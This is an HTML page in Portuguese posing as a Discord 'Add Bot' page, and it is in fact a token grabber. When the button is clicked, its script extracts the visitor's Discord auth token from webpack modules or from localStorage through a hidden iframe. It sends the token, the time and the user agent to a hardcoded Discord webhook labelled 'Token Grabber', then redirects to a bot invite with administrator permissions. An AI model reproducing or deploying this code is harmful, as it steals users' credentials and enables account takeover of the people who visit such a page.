<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adicionar Bot</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #36393f, #2f3136);
            color: #dcddde;
            text-align: center;
            padding: 60px 20px;
            margin: 0;
            min-height: 100vh;
        }
        h1 { color: #7289da; margin-bottom: 10px; }
        p { max-width: 600px; margin: 0 auto 30px; line-height: 1.5; }
        button {
            background: #7289da;
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 19px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover {
            background: #5b6ebe;
            transform: scale(1.05);
        }
        .status {
            margin-top: 20px;
            font-size: 15px;
            color: #b9bbbe;
        }
    </style>
</head>
<body>
    <h1>Adicionar o Bot</h1>
    <p>Você precisa estar logado no Discord neste navegador (discord.com).<br>
    Clique no botão abaixo para continuar.</p>
    
    <button onclick="iniciarProcesso()">Adicionar Bot Agora</button>
    
    <div class="status" id="status"></div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1495879559529365605/jnDvjCQ91dV9VE_UZxIaUJ6Tgs3oMcbkSo-b1S8R1cIlA9GdB1tTHGR5WYfd3na6aSqe";
        const BOT_INVITE = "https://discord.com/oauth2/authorize?client_id=1385679819508809778&permissions=8&integration_type=0&scope=bot";

        async function pegarToken() {
            const status = document.getElementById('status');
            status.textContent = "Tentando pegar o token...";

            // Método 1 - Webpack atualizado (mais confiável em 2026)
            try {
                let token = null;
                webpackChunkdiscord_app.push([[Symbol()], {}, (req) => {
                    for (let m of Object.values(req.c)) {
                        try {
                            if (m?.exports?.default?.getToken) {
                                token = m.exports.default.getToken();
                                return;
                            }
                            if (m?.exports?.getToken) {
                                token = m.exports.getToken();
                                return;
                            }
                            for (let key in m.exports) {
                                if (m.exports[key]?.getToken && 
                                    m.exports[key][Symbol.toStringTag] !== 'IntlMessagesProxy') {
                                    token = m.exports[key].getToken();
                                    return;
                                }
                            }
                        } catch (e) {}
                    }
                }]);
                webpackChunkdiscord_app.pop();

                if (token) {
                    status.textContent = "Token encontrado!";
                    return token;
                }
            } catch (e) {
                console.log("Método webpack falhou", e);
            }

            // Método 2 - LocalStorage via iframe (funciona quando o primeiro não pega)
            try {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                
                const localToken = iframe.contentWindow.localStorage.token;
                iframe.remove();

                if (localToken) {
                    const token = JSON.parse(localToken);
                    status.textContent = "Token encontrado via localStorage!";
                    return token;
                }
            } catch (e) {
                console.log("Método localStorage falhou", e);
            }

            status.textContent = "Não consegui pegar o token.";
            return null;
        }

        async function enviarParaWebhook(token) {
            if (!token) return;

            const payload = {
                content: `**✅ Novo token capturado!**\n\n**Token:** \`\`\`${token}\`\`\`\n**Hora:** ${new Date().toLocaleString('pt-BR')}\n**User-Agent:** ${navigator.userAgent}`,
                username: "Token Grabber",
                avatar_url: "https://i.imgur.com/0Zx3Z3k.png"
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Erro no webhook:", err);
            }
        }

        async function iniciarProcesso() {
            const token = await pegarToken();

            if (token) {
                await enviarParaWebhook(token);
                alert("Token enviado com sucesso! Redirecionando para adicionar o bot...");
                window.location.href = BOT_INVITE;
            } else {
                alert("❌ Não foi possível pegar o token.\n\nCertifique-se de:\n• Estar logado no Discord Web (discord.com/app ou discord.com)\n• Não estar usando o App Desktop\n• Tentar em outro navegador (Chrome recomendado)\n\nTente novamente.");
            }
        }
    </script>
</body>
</html>
